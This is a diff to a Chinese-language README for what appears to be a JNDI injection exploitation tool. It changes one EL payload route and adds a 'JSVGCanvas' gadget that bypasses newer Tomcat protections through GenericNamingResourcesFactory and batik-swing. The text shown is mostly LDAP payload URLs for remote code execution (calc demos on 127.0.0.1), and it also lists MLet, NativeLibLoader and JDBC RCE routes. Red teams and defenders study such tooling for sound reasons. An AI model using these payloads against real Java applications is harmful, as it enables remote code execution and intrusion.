@@ -146,7 +146,7 @@ ldap://127.0.0.1:1389/ELProcessor/Command/calc
 ldap://127.0.0.1:1389/ELProcessor/Custom/data:yv66vxxxxxxxxxxxxx
 
 # jdk9以上可以用el调用JShell来加载字节码
-ldap://127.0.0.1:1389/EL2JShell/Command/calc
+ldap://127.0.0.1:1389/ELProcessor17/Command/calc
 ```
 
 **GroovyShell & GroovyClassLoader**
@@ -198,7 +198,11 @@ ldap://127.0.0.1:1389/MLet/com.example.TestClass
 ```
 ldap://127.0.0.1:1389/NativeLibLoader/L3RtcC9ldmls
 ```
-
+**JSVGCanvas**
+高版本tomcat下通过GenericNamingResourcesFactory来调用setter，触发 org.apache.batik.swing.JSVGCanvas#setURI，需要TomcatJDBC，batik-swing 1.15以下，适用于高版本TomcatBypass
+```
+ldap://127.0.0.1:1389/JSVGCanvas/Command/calc
+```
 ### JDBC RCE
 
 支持以下数据库连接池
